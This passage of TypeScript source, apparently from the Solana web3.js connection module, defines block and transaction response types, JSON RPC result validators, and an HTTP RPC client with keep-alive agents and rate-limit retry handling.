ParsedTransactionWithMeta} instead.\n */\nexport type ParsedConfirmedTransaction = ParsedTransactionWithMeta;\n\n/**\n * A parsed transaction on the ledger with meta\n */\nexport type ParsedTransactionWithMeta = {\n  /** The slot during which the transaction was processed */\n  slot: number;\n  /** The details of the transaction */\n  transaction: ParsedTransaction;\n  /** Metadata produced from the transaction */\n  meta: ParsedTransactionMeta | null;\n  /** The unix timestamp of when the transaction was processed */\n  blockTime?: number | null;\n  /** The version of the transaction message */\n  version?: TransactionVersion;\n};\n\n/**\n * A processed block fetched from the RPC API\n */\nexport type BlockResponse = {\n  /** Blockhash of this block */\n  blockhash: Blockhash;\n  /** Blockhash of this block's parent */\n  previousBlockhash: Blockhash;\n  /** Slot index of this block's parent */\n  parentSlot: number;\n  /** Vector of transactions with status meta and original message */\n  transactions: Array<{\n    /** The transaction */\n    transaction: {\n      /** The transaction message */\n      message: Message;\n      /** The transaction signatures */\n      signatures: string[];\n    };\n    /** Metadata produced from the transaction */\n    meta: ConfirmedTransactionMeta | null;\n    /** The transaction version */\n    version?: TransactionVersion;\n  }>;\n  /** Vector of block rewards */\n  rewards?: Array<{\n    /** Public key of reward recipient */\n    pubkey: string;\n    /** Reward value in lamports */\n    lamports: number;\n    /** Account balance after reward is applied */\n    postBalance: number | null;\n    /** Type of reward received */\n    rewardType: string | null;\n    /** Vote account commission when the reward was credited, only present for voting and staking rewards */\n    commission?: number | null;\n  }>;\n  /** The unix timestamp of when the block was processed */\n  blockTime: number | null;\n};\n\n/**\n * A processed block fetched from the RPC API where the `transactionDetails` mode is `accounts`\n */\nexport type AccountsModeBlockResponse = VersionedAccountsModeBlockResponse;\n\n/**\n * A processed block fetched from the RPC API where the `transactionDetails` mode is `none`\n */\nexport type NoneModeBlockResponse = VersionedNoneModeBlockResponse;\n\n/**\n * A block with parsed transactions\n */\nexport type ParsedBlockResponse = {\n  /** Blockhash of this block */\n  blockhash: Blockhash;\n  /** Blockhash of this block's parent */\n  previousBlockhash: Blockhash;\n  /** Slot index of this block's parent */\n  parentSlot: number;\n  /** Vector of transactions with status meta and original message */\n  transactions: Array<{\n    /** The details of the transaction */\n    transaction: ParsedTransaction;\n    /** Metadata produced from the transaction */\n    meta: ParsedTransactionMeta | null;\n    /** The transaction version */\n    version?: TransactionVersion;\n  }>;\n  /** Vector of block rewards */\n  rewards?: Array<{\n    /** Public key of reward recipient */\n    pubkey: string;\n    /** Reward value in lamports */\n    lamports: number;\n    /** Account balance after reward is applied */\n    postBalance: number | null;\n    /** Type of reward received */\n    rewardType: string | null;\n    /** Vote account commission when the reward was credited, only present for voting and staking rewards */\n    commission?: number | null;\n  }>;\n  /** The unix timestamp of when the block was processed */\n  blockTime: number | null;\n  /** The number of blocks beneath this block */\n  blockHeight: number | null;\n};\n\n/**\n * A block with parsed transactions where the `transactionDetails` mode is `accounts`\n */\nexport type ParsedAccountsModeBlockResponse = Omit<\n  ParsedBlockResponse,\n  'transactions'\n> & {\n  transactions: Array<\n    Omit<ParsedBlockResponse['transactions'][number], 'transaction'> & {\n      transaction: Pick<\n        ParsedBlockResponse['transactions'][number]['transaction'],\n        'signatures'\n      > & {\n        accountKeys: ParsedMessageAccount[];\n      };\n    }\n  >;\n};\n\n/**\n * A block with parsed transactions where the `transactionDetails` mode is `none`\n */\nexport type ParsedNoneModeBlockResponse = Omit<\n  ParsedBlockResponse,\n  'transactions'\n>;\n\n/**\n * A processed block fetched from the RPC API\n */\nexport type VersionedBlockResponse = {\n  /** Blockhash of this block */\n  blockhash: Blockhash;\n  /** Blockhash of this block's parent */\n  previousBlockhash: Blockhash;\n  /** Slot index of this block's parent */\n  parentSlot: number;\n  /** Vector of transactions with status meta and original message */\n  transactions: Array<{\n    /** The transaction */\n    transaction: {\n      /** The transaction message */\n      message: VersionedMessage;\n      /** The transaction signatures */\n      signatures: string[];\n    };\n    /** Metadata produced from the transaction */\n    meta: ConfirmedTransactionMeta | null;\n    /** The transaction version */\n    version?: TransactionVersion;\n  }>;\n  /** Vector of block rewards */\n  rewards?: Array<{\n    /** Public key of reward recipient */\n    pubkey: string;\n    /** Reward value in lamports */\n    lamports: number;\n    /** Account balance after reward is applied */\n    postBalance: number | null;\n    /** Type of reward received */\n    rewardType: string | null;\n    /** Vote account commission when the reward was credited, only present for voting and staking rewards */\n    commission?: number | null;\n  }>;\n  /** The unix timestamp of when the block was processed */\n  blockTime: number | null;\n};\n\n/**\n * A processed block fetched from the RPC API where the `transactionDetails` mode is `accounts`\n */\nexport type VersionedAccountsModeBlockResponse = Omit<\n  VersionedBlockResponse,\n  'transactions'\n> & {\n  transactions: Array<\n    Omit<VersionedBlockResponse['transactions'][number], 'transaction'> & {\n      transaction: Pick<\n        VersionedBlockResponse['transactions'][number]['transaction'],\n        'signatures'\n      > & {\n        accountKeys: ParsedMessageAccount[];\n      };\n    }\n  >;\n};\n\n/**\n * A processed block fetched from the RPC API where the `transactionDetails` mode is `none`\n */\nexport type VersionedNoneModeBlockResponse = Omit<\n  VersionedBlockResponse,\n  'transactions'\n>;\n\n/**\n * A confirmed block on the ledger\n *\n * @deprecated Deprecated since RPC v1.8.0.\n */\nexport type ConfirmedBlock = {\n  /** Blockhash of this block */\n  blockhash: Blockhash;\n  /** Blockhash of this block's parent */\n  previousBlockhash: Blockhash;\n  /** Slot index of this block's parent */\n  parentSlot: number;\n  /** Vector of transactions and status metas */\n  transactions: Array<{\n    transaction: Transaction;\n    meta: ConfirmedTransactionMeta | null;\n  }>;\n  /** Vector of block rewards */\n  rewards?: Array<{\n    pubkey: string;\n    lamports: number;\n    postBalance: number | null;\n    rewardType: string | null;\n    commission?: number | null;\n  }>;\n  /** The unix timestamp of when the block was processed */\n  blockTime: number | null;\n};\n\n/**\n * A Block on the ledger with signatures only\n */\nexport type BlockSignatures = {\n  /** Blockhash of this block */\n  blockhash: Blockhash;\n  /** Blockhash of this block's parent */\n  previousBlockhash: Blockhash;\n  /** Slot index of this block's parent */\n  parentSlot: number;\n  /** Vector of signatures */\n  signatures: Array<string>;\n  /** The unix timestamp of when the block was processed */\n  blockTime: number | null;\n};\n\n/**\n * recent block production information\n */\nexport type BlockProduction = Readonly<{\n  /** a dictionary of validator identities, as base-58 encoded strings. Value is a two element array containing the number of leader slots and the number of blocks produced */\n  byIdentity: Readonly<Record<string, ReadonlyArray<number>>>;\n  /** Block production slot range */\n  range: Readonly<{\n    /** first slot of the block production information (inclusive) */\n    firstSlot: number;\n    /** last slot of block production information (inclusive) */\n    lastSlot: number;\n  }>;\n}>;\n\nexport type GetBlockProductionConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** Slot range to return block production for. If parameter not provided, defaults to current epoch. */\n  range?: {\n    /** first slot to return block production information for (inclusive) */\n    firstSlot: number;\n    /** last slot to return block production information for (inclusive). If parameter not provided, defaults to the highest slot */\n    lastSlot?: number;\n  };\n  /** Only return results for this validator identity (base-58 encoded) */\n  identity?: string;\n};\n\n/**\n * Expected JSON RPC response for the \"getBlockProduction\" message\n */\nconst BlockProductionResponseStruct = jsonRpcResultAndContext(\n  pick({\n    byIdentity: record(string(), array(number())),\n    range: pick({\n      firstSlot: number(),\n      lastSlot: number(),\n    }),\n  }),\n);\n\n/**\n * A performance sample\n */\nexport type PerfSample = {\n  /** Slot number of sample */\n  slot: number;\n  /** Number of transactions in a sample window */\n  numTransactions: number;\n  /** Number of slots in a sample window */\n  numSlots: number;\n  /** Sample window in seconds */\n  samplePeriodSecs: number;\n};\n\nfunction createRpcClient(\n  url: string,\n  httpHeaders?: HttpHeaders,\n  customFetch?: FetchFn,\n  fetchMiddleware?: FetchMiddleware,\n  disableRetryOnRateLimit?: boolean,\n  httpAgent?: NodeHttpAgent | NodeHttpsAgent | false,\n): RpcClient {\n  const fetch = customFetch ? customFetch : fetchImpl;\n  let agent: NodeHttpAgent | NodeHttpsAgent | undefined;\n  if (process.env.BROWSER) {\n    if (httpAgent != null) {\n      console.warn(\n        'You have supplied an `httpAgent` when creating a `Connection` in a browser environment.' +\n          'It has been ignored; `httpAgent` is only used in Node environments.',\n      );\n    }\n  } else {\n    if (httpAgent == null) {\n      if (process.env.NODE_ENV !== 'test') {\n        const agentOptions = {\n          // One second fewer than the Solana RPC's keepalive timeout.\n          // Read more: https://github.com/solana-labs/solana/issues/27859#issuecomment-1340097889\n          freeSocketTimeout: 19000,\n          keepAlive: true,\n          maxSockets: 25,\n        };\n        if (url.startsWith('https:')) {\n          agent = new HttpsKeepAliveAgent(agentOptions);\n        } else {\n          agent = new HttpKeepAliveAgent(agentOptions);\n        }\n      }\n    } else {\n      if (httpAgent !== false) {\n        const isHttps = url.startsWith('https:');\n        if (isHttps && !(httpAgent instanceof NodeHttpsAgent)) {\n          throw new Error(\n            'The endpoint `' +\n              url +\n              '` can only be paired with an `https.Agent`. You have, instead, supplied an ' +\n              '`http.Agent` through `httpAgent`.',\n          );\n        } else if (!isHttps && httpAgent instanceof NodeHttpsAgent) {\n          throw new Error(\n            'The endpoint `' +\n              url +\n              '` can only be paired with an `http.Agent`. You have, instead, supplied an ' +\n              '`https.Agent` through `httpAgent`.',\n          );\n        }\n        agent = httpAgent;\n      }\n    }\n  }\n\n  let fetchWithMiddleware: FetchFn | undefined;\n\n  if (fetchMiddleware) {\n    fetchWithMiddleware = async (info, init) => {\n      const modifiedFetchArgs = await new Promise<Parameters<FetchFn>>(\n        (resolve, reject) => {\n          try {\n            fetchMiddleware(info, init, (modifiedInfo, modifiedInit) =>\n              resolve([modifiedInfo, modifiedInit]),\n            );\n          } catch (error) {\n            reject(error);\n          }\n        },\n      );\n      return await fetch(...modifiedFetchArgs);\n    };\n  }\n\n  const clientBrowser = new RpcClient(async (request, callback) => {\n    const options = {\n      method: 'POST',\n      body: request,\n      agent,\n      headers: Object.assign(\n        {\n          'Content-Type': 'application/json',\n        },\n        httpHeaders || {},\n        COMMON_HTTP_HEADERS,\n      ),\n    };\n\n    try {\n      let too_many_requests_retries = 5;\n      let res: Response;\n      let waitTime = 500;\n      for (;;) {\n        if (fetchWithMiddleware) {\n          res = await fetchWithMiddleware(url, options);\n        } else {\n          res = await fetch(url, options);\n        }\n\n        if (res.status !== 429 /* Too many requests */) {\n          break;\n        }\n        if (disableRetryOnRateLimit === true) {\n          break;\n        }\n        too_many_requests_retries -= 1;\n        if (too_many_requests_retries === 0) {\n          break;\n        }\n        console.error(\n          `Server responded with ${res.status} ${res.statusText}.  Retrying after ${waitTime}ms delay...`,\n        );\n        await sleep(waitTime);\n        waitTime *= 2;\n      }\n\n      const text = await res.text();\n      if (res.ok) {\n        callback(null, text);\n      } else {\n        callback(new Error(`${res.status} ${res.statusText}: ${text}`));\n      }\n    } catch (err) {\n      if (err instanceof Error) callback(err);\n    }\n  }, {});\n\n  return clientBrowser;\n}\n\nfunction createRpcRequest(client: RpcClient): RpcRequest {\n  return (method, args) => {\n    return new Promise((resolve, reject) => {\n      client.request(method, args, (err: any, response: any) => {\n        if (err) {\n          reject(err);\n          return;\n        }\n        resolve(response);\n      });\n    });\n  };\n}\n\nfunction createRpcBatchRequest(client: RpcClient): RpcBatchRequest {\n  return (requests: RpcParams[]) => {\n    return new Promise((resolve, reject) => {\n      // Do nothing if requests is empty\n      if (requests.length === 0) resolve([]);\n\n      const batch = requests.map((params: RpcParams) => {\n        return client.request(params.methodName, params.args);\n      });\n\n      client.request(batch, (err: any, response: any) => {\n        if (err) {\n          reject(err);\n          return;\n        }\n        resolve(response);\n      });\n    });\n  };\n}\n\n/**\n * Expected JSON RPC response for the \"getInflationGovernor\" message\n */\nconst GetInflationGovernorRpcResult = jsonRpcResult(GetInflationGovernorResult);\n\n/**\n * Expected JSON RPC response for the \"getInflationRate\" message\n */\nconst GetInflationRateRpcResult = jsonRpcResult(GetInflationRateResult);\n\n/**\n * Expected JSON RPC response for the \"getRecentPrioritizationFees\" message\n */\nconst GetRecentPrioritizationFeesRpcResult = jsonRpcResult(\n  GetRecentPrioritizationFeesResult,\n);\n\n/**\n * Expected JSON RPC response for the \"getEpochInfo\" message\n */\nconst GetEpochInfoRpcResult = jsonRpcResult(GetEpochInfoResult);\n\n/**\n * Expected JSON RPC response for the \"getEpochSchedule\" message\n */\nconst GetEpochScheduleRpcResult = jsonRpcResult(GetEpochScheduleResult);\n\n/**\n * Expected JSON RPC response for the \"getLeaderSchedule\" message\n */\nconst GetLeaderScheduleRpcResult = jsonRpcResult(GetLeaderScheduleResult);\n\n/**\n * Expected JSON RPC response for the \"minimumLedgerSlot\" and \"getFirstAvailableBlock\" messages\n */\nconst SlotRpcResult = jsonRpcResult(number());\n\n/**\n * Supply\n */\nexport type Supply = {\n  /** Total supply in lamports */\n  total: number;\n  /** Circulating supply in lamports */\n  circulating: number;\n  /** Non-circulating supply in lamports */\n  nonCirculating: number;\n  /** List of non-circulating account addresses */\n  nonCirculatingAccounts: Array<PublicKey>;\n};\n\n/**\n * Expected JSON RPC response for the \"getSupply\" message\n */\nconst GetSupplyRpcResult = jsonRpcResultAndContext(\n  pick({\n    total: number(),\n    circulating: number(),\n    nonCirculating: number(),\n    nonCirculatingAccounts: array(PublicKeyFromString),\n  }),\n);\n\n/**\n * Token amount object which returns a token amount in different formats\n * for various client use cases.\n */\nexport type TokenAmount = {\n  /** Raw amount of tokens as string ignoring decimals */\n  amount: string;\n  /** Number of decimals configured for token's mint */\n  decimals: number;\n  /** Token amount as float, accounts for decimals */\n  uiAmount: number | null;\n  /** Token amount as string, accounts for decimals */\n  uiAmountString?: string;\n};\n\n/**\n * Expected JSON RPC structure for token amounts\n */\nconst TokenAmountResult = pick({\n  amount: string(),\n  uiAmount: nullable(number()),\n  decimals: number(),\n  uiAmountString: optional(string()),\n});\n\n/**\n * Token address and balance.\n */\nexport type TokenAccountBalancePair = {\n  /** Address of the token account */\n  address: PublicKey;\n  /** Raw amount of tokens as string ignoring decimals */\n  amount: string;\n  /** Number of decimals configured for token's mint */\n  decimals: number;\n  /** Token amount as float, accounts for decimals */\n  uiAmount: number | null;\n  /** Token amount as string, accounts for decimals */\n  uiAmountString?: string;\n};\n\n/**\n * Expected JSON RPC response for the \"getTokenLargestAccounts\" message\n */\nconst GetTokenLargestAccountsResult = jsonRpcResultAndContext(\n  array(\n    pick({\n      address: PublicKeyFromString,\n      amount: string(),\n      uiAmount: nullable(number()),\n      decimals: number(),\n      uiAmountString: optional(string()),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getTokenAccountsByOwner\" message\n */\nconst GetTokenAccountsByOwner = jsonRpcResultAndContext(\n  array(\n    pick({\n      pubkey: PublicKeyFromString,\n      account: pick({\n        executable: boolean(),\n        owner: PublicKeyFromString,\n        lamports: number(),\n        data: BufferFromRawAccountData,\n        rentEpoch: number(),\n      }),\n    }),\n  ),\n);\n\nconst ParsedAccountDataResult = pick({\n  program: string(),\n  parsed: unknown(),\n  space: number(),\n});\n\n/**\n * Expected JSON RPC response for the \"getTokenAccountsByOwner\" message with parsed data\n */\nconst GetParsedTokenAccountsByOwner = jsonRpcResultAndContext(\n  array(\n    pick({\n      pubkey: PublicKeyFromString,\n      account: pick({\n        executable: boolean(),\n        owner: PublicKeyFromString,\n        lamports: number(),\n        data: ParsedAccountDataResult,\n        rentEpoch: number(),\n      }),\n    }),\n  ),\n);\n\n/**\n * Pair of an account address and its balance\n */\nexport type AccountBalancePair = {\n  address: PublicKey;\n  lamports: number;\n};\n\n/**\n * Expected JSON RPC response for the \"getLargestAccounts\" message\n */\nconst GetLargestAccountsRpcResult = jsonRpcResultAndContext(\n  array(\n    pick({\n      lamports: number(),\n      address: PublicKeyFromString,\n    }),\n  ),\n);\n\n/**\n * @internal\n */\nconst AccountInfoResult = pick({\n  executable: boolean(),\n  owner: PublicKeyFromString,\n  lamports: number(),\n  data: BufferFromRawAccountData,\n  rentEpoch: number(),\n});\n\n/**\n * @internal\n */\nconst KeyedAccountInfoResult = pick({\n  pubkey: PublicKeyFromString,\n  account: AccountInfoResult,\n});\n\nconst ParsedOrRawAccountData = coerce(\n  union([instance(Buffer), ParsedAccountDataResult]),\n  union([RawAccountDataResult, ParsedAccountDataResult]),\n  value => {\n    if (Array.isArray(value)) {\n      return create(value, BufferFromRawAccountData);\n    } else {\n      return value;\n    }\n  },\n);\n\n/**\n * @internal\n */\nconst ParsedAccountInfoResult = pick({\n  executable: boolean(),\n  owner: PublicKeyFromString,\n  lamports: number(),\n  data: ParsedOrRawAccountData,\n  rentEpoch: number(),\n});\n\nconst KeyedParsedAccountInfoResult = pick({\n  pubkey: PublicKeyFromString,\n  account: ParsedAccountInfoResult,\n});\n\n/**\n * @internal\n */\nconst StakeActivationResult = pick({\n  state: union([\n    literal('active'),\n    literal('inactive'),\n    literal('activating'),\n    literal('deactivating'),\n  ]),\n  active: number(),\n  inactive: number(),\n});\n\n/**\n * Expected JSON RPC response for the \"getConfirmedSignaturesForAddress2\" message\n */\n\nconst GetConfirmedSignaturesForAddress2RpcResult = jsonRpcResult(\n  array(\n    pick({\n      signature: string(),\n      slot: number(),\n      err: TransactionErrorResult,\n      memo: nullable(string()),\n      blockTime: optional(nullable(number())),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getSignaturesForAddress\" message\n */\nconst GetSignaturesForAddressRpcResult = jsonRpcResult(\n  array(\n    pick({\n      signature: string(),\n      slot: number(),\n      err: TransactionErrorResult,\n      memo: nullable(string()),\n      blockTime: optional(nullable(number())),\n    }),\n  ),\n);\n\n/***\n * Expected JSON RPC response for the \"accountNotification\" message\n */\nconst AccountNotificationResult = pick({\n  subscription: number(),\n  result: notificationResultAndContext(AccountInfoResult),\n});\n\n/**\n * @internal\n */\nconst ProgramAccountInfoResult = pick({\n  pubkey: PublicKeyFromString,\n  account: AccountInfoResult,\n});\n\n/***\n * Expected JSON RPC response for the \"programNotification\" message\n */\nconst ProgramAccountNotificationResult = pick({\n  subscription: number(),\n  result: notificationResultAndContext(ProgramAccountInfoResult),\n});\n\n/**\n * @internal\n */\nconst SlotInfoResult = pick({\n  parent: number(),\n  slot: number(),\n  root: number(),\n});\n\n/**\n * Expected JSON RPC response for the \"slotNotification\" message\n */\nconst SlotNotificationResult = pick({\n  subscription: number(),\n  result: SlotInfoResult,\n});\n\n/**\n * Slot updates which can be used for tracking the live progress of a cluster.\n * - `\"firstShredReceived\"`: connected node received the first shred of a block.\n * Indicates that a new block that is being produced.\n * - `\"completed\"`: connected node has received all shreds of a block. Indicates\n * a block was recently produced.\n * - `\"optimisticConfirmation\"`: block was optimistically confirmed by the\n * cluster. It is not guaranteed that an optimistic confirmation notification\n * will be sent for every finalized blocks.\n * - `\"root\"`: the connected node rooted this block.\n * - `\"createdBank\"`: the connected node has started validating this block.\n * - `\"frozen\"`: the connected node has validated this block.\n * - `\"dead\"`: the connected node failed to validate this block.\n */\nexport type SlotUpdate =\n  | {\n      type: 'firstShredReceived';\n      slot: number;\n      timestamp: number;\n    }\n  | {\n      type: 'completed';\n      slot: number;\n      timestamp: number;\n    }\n  | {\n      type: 'createdBank';\n      slot: number;\n      timestamp: number;\n      parent: number;\n    }\n  | {\n      type: 'frozen';\n      slot: number;\n      timestamp: number;\n      stats: {\n        numTransactionEntries: number;\n        numSuccessfulTransactions: number;\n        numFailedTransactions: number;\n        maxTransactionsPerEntry: number;\n      };\n    }\n  | {\n      type: 'dead';\n      slot: number;\n      timestamp: number;\n      err: string;\n    }\n  | {\n      type: 'optimisticConfirmation';\n      slot: number;\n      timestamp: number;\n    }\n  | {\n      type: 'root';\n      slot: number;\n      timestamp: number;\n    };\n\n/**\n * @internal\n */\nconst SlotUpdateResult = union([\n  pick({\n    type: union([\n      literal('firstShredReceived'),\n      literal('completed'),\n      literal('optimisticConfirmation'),\n      literal('root'),\n    ]),\n    slot: number(),\n    timestamp: number(),\n  }),\n  pick({\n    type: literal('createdBank'),\n    parent: number(),\n    slot: number(),\n    timestamp: number(),\n  }),\n  pick({\n    type: literal('frozen'),\n    slot: number(),\n    timestamp: number(),\n    stats: pick({\n      numTransactionEntries: number(),\n      numSuccessfulTransactions: number(),\n      numFailedTransactions: number(),\n      maxTransactionsPerEntry: number(),\n    }),\n  }),\n  pick({\n    type: literal('dead'),\n    slot: number(),\n    timestamp: number(),\n    err: string(),\n  }),\n]);\n\n/**\n * Expected JSON RPC response for the \"slotsUpdatesNotification\" message\n */\nconst SlotUpdateNotificationResult = pick({\n  subscription: number(),\n  result: SlotUpdateResult,\n});\n\n/**\n * Expected JSON RPC response for the \"signatureNotification\" message\n */\nconst SignatureNotificationResult = pick({\n  subscription: number(),\n  result: notificationResultAndContext(\n    union([SignatureStatusResult, SignatureReceivedResult]),\n  ),\n});\n\n/**\n * Expected JSON RPC response for the \"rootNotification\" message\n */\nconst RootNotificationResult = pick({\n  subscription: number(),\n  result: number(),\n});\n\nconst ContactInfoResult = pick({\n  pubkey: string(),\n  gossip: nullable(string()),\n  tpu: nullable(string()),\n  rpc: nullable(string()),\n  version: nullable(string()),\n});\n\nconst VoteAccountInfoResult = pick({\n  votePubkey: string(),\n  nodePubkey: string(),\n  activatedStake: number(),\n  epochVoteAccount: boolean(),\n  epochCredits: array(tuple([number(), number(), number()])),\n  commission: number(),\n  lastVote: number(),\n  rootSlot: nullable(number()),\n});\n\n/**\n * Expected JSON RPC response for the \"getVoteAccounts\" message\n */\nconst GetVoteAccounts = jsonRpcResult(\n  pick({\n    current: array(VoteAccountInfoResult),\n    delinquent: array(VoteAccountInfoResult),\n  }),\n);\n\nconst ConfirmationStatus = union([\n  literal('processed'),\n  literal('confirmed'),\n  literal('finalized'),\n]);\n\nconst SignatureStatusResponse = pick({\n  slot: number(),\n  confirmations: nullable(number()),\n  err: TransactionErrorResult,\n  confirmationStatus: optional(ConfirmationStatus),\n});\n\n/**\n * Expected JSON RPC response for the \"getSignatureStatuses\" message\n */\nconst GetSignatureStatusesRpcResult = jsonRpcResultAndContext(\n  array(nullable(SignatureStatusResponse)),\n);\n\n/**\n * Expected JSON RPC response for the \"getMinimumBalanceForRentExemption\" message\n */\nconst GetMinimumBalanceForRentExemptionRpcResult = jsonRpcResult(number());\n\nconst AddressTableLookupStruct = pick({\n  accountKey: PublicKeyFromString,\n  writableIndexes: array(number()),\n  readonlyIndexes: array(number()),\n});\n\nconst ConfirmedTransactionResult = pick({\n  signatures: array(string()),\n  message: pick({\n    accountKeys: array(string()),\n    header: pick({\n      numRequiredSignatures: number(),\n      numReadonlySignedAccounts: number(),\n      numReadonlyUnsignedAccounts: number(),\n    }),\n    instructions: array(\n      pick({\n        accounts: array(number()),\n        data: string(),\n        programIdIndex: number(),\n      }),\n    ),\n    recentBlockhash: string(),\n    addressTableLookups: optional(array(AddressTableLookupStruct)),\n  }),\n});\n\nconst AnnotatedAccountKey = pick({\n  pubkey: PublicKeyFromString,\n  signer: boolean(),\n  writable: boolean(),\n  source: optional(union([literal('transaction'), literal('lookupTable')])),\n});\n\nconst ConfirmedTransactionAccountsModeResult = pick({\n  accountKeys: array(AnnotatedAccountKey),\n  signatures: array(string()),\n});\n\nconst ParsedInstructionResult = pick({\n  parsed: unknown(),\n  program: string(),\n  programId: PublicKeyFromString,\n});\n\nconst RawInstructionResult = pick({\n  accounts: array(PublicKeyFromString),\n  data: string(),\n  programId: PublicKeyFromString,\n});\n\nconst InstructionResult = union([\n  RawInstructionResult,\n  ParsedInstructionResult,\n]);\n\nconst UnknownInstructionResult = union([\n  pick({\n    parsed: unknown(),\n    program: string(),\n    programId: string(),\n  }),\n  pick({\n    accounts: array(string()),\n    data: string(),\n    programId: string(),\n  }),\n]);\n\nconst ParsedOrRawInstruction = coerce(\n  InstructionResult,\n  UnknownInstructionResult,\n  value => {\n    if ('accounts' in value) {\n      return create(value, RawInstructionResult);\n    } else {\n      return create(value, ParsedInstructionResult);\n    }\n  },\n);\n\n/**\n * @internal\n */\nconst ParsedConfirmedTransactionResult = pick({\n  signatures: array(string()),\n  message: pick({\n    accountKeys: array(AnnotatedAccountKey),\n    instructions: array(ParsedOrRawInstruction),\n    recentBlockhash: string(),\n    addressTableLookups: optional(nullable(array(AddressTableLookupStruct))),\n  }),\n});\n\nconst TokenBalanceResult = pick({\n  accountIndex: number(),\n  mint: string(),\n  owner: optional(string()),\n  programId: optional(string()),\n  uiTokenAmount: TokenAmountResult,\n});\n\nconst LoadedAddressesResult = pick({\n  writable: array(PublicKeyFromString),\n  readonly: array(PublicKeyFromString),\n});\n\n/**\n * @internal\n */\nconst ConfirmedTransactionMetaResult = pick({\n  err: TransactionErrorResult,\n  fee: number(),\n  innerInstructions: optional(\n    nullable(\n      array(\n        pick({\n          index: number(),\n          instructions: array(\n            pick({\n              accounts: array(number()),\n              data: string(),\n              programIdIndex: number(),\n            }),\n          ),\n        }),\n      ),\n    ),\n  ),\n  preBalances: array(number()),\n  postBalances: array(number()),\n  logMessages: optional(nullable(array(string()))),\n  preTokenBalances: optional(nullable(array(TokenBalanceResult))),\n  postTokenBalances: optional(nullable(array(TokenBalanceResult))),\n  loadedAddresses: optional(LoadedAddressesResult),\n  computeUnitsConsumed: optional(number()),\n});\n\n/**\n * @internal\n */\nconst ParsedConfirmedTransactionMetaResult = pick({\n  err: TransactionErrorResult,\n  fee: number(),\n  innerInstructions: optional(\n    nullable(\n      array(\n        pick({\n          index: number(),\n          instructions: array(ParsedOrRawInstruction),\n        }),\n      ),\n    ),\n  ),\n  preBalances: array(number()),\n  postBalances: array(number()),\n  logMessages: optional(nullable(array(string()))),\n  preTokenBalances: optional(nullable(array(TokenBalanceResult))),\n  postTokenBalances: optional(nullable(array(TokenBalanceResult))),\n  loadedAddresses: optional(LoadedAddressesResult),\n  computeUnitsConsumed: optional(number()),\n});\n\nconst TransactionVersionStruct = union([literal(0), literal('legacy')]);\n\n/** @internal */\nconst RewardsResult = pick({\n  pubkey: string(),\n  lamports: number(),\n  postBalance: nullable(number()),\n  rewardType: nullable(string()),\n  commission: optional(nullable(number())),\n});\n\n/**\n * Expected JSON RPC response for the \"getBlock\" message\n */\nconst GetBlockRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      transactions: array(\n        pick({\n          transaction: ConfirmedTransactionResult,\n          meta: nullable(ConfirmedTransactionMetaResult),\n          version: optional(TransactionVersionStruct),\n        }),\n      ),\n      rewards: optional(array(RewardsResult)),\n      blockTime: nullable(number()),\n      blockHeight: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getBlock\" message when `transactionDetails` is `none`\n */\nconst GetNoneModeBlockRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      rewards: optional(array(RewardsResult)),\n      blockTime: nullable(number()),\n      blockHeight: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getBlock\" message when `transactionDetails` is `accounts`\n */\nconst GetAccountsModeBlockRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      transactions: array(\n        pick({\n          transaction: ConfirmedTransactionAccountsModeResult,\n          meta: nullable(ConfirmedTransactionMetaResult),\n          version: optional(TransactionVersionStruct),\n        }),\n      ),\n      rewards: optional(array(RewardsResult)),\n      blockTime: nullable(number()),\n      blockHeight: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected parsed JSON RPC response for the \"getBlock\" message\n */\nconst GetParsedBlockRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      transactions: array(\n        pick({\n          transaction: ParsedConfirmedTransactionResult,\n          meta: nullable(ParsedConfirmedTransactionMetaResult),\n          version: optional(TransactionVersionStruct),\n        }),\n      ),\n      rewards: optional(array(RewardsResult)),\n      blockTime: nullable(number()),\n      blockHeight: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected parsed JSON RPC response for the \"getBlock\" message  when `transactionDetails` is `accounts`\n */\nconst GetParsedAccountsModeBlockRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      transactions: array(\n        pick({\n          transaction: ConfirmedTransactionAccountsModeResult,\n          meta: nullable(ParsedConfirmedTransactionMetaResult),\n          version: optional(TransactionVersionStruct),\n        }),\n      ),\n      rewards: optional(array(RewardsResult)),\n      blockTime: nullable(number()),\n      blockHeight: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected parsed JSON RPC response for the \"getBlock\" message  when `transactionDetails` is `none`\n */\nconst GetParsedNoneModeBlockRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      rewards: optional(array(RewardsResult)),\n      blockTime: nullable(number()),\n      blockHeight: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getConfirmedBlock\" message\n *\n * @deprecated Deprecated since RPC v1.8.0. Please use {@link GetBlockRpcResult} instead.\n */\nconst GetConfirmedBlockRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      transactions: array(\n        pick({\n          transaction: ConfirmedTransactionResult,\n          meta: nullable(ConfirmedTransactionMetaResult),\n        }),\n      ),\n      rewards: optional(array(RewardsResult)),\n      blockTime: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getBlock\" message\n */\nconst GetBlockSignaturesRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      blockhash: string(),\n      previousBlockhash: string(),\n      parentSlot: number(),\n      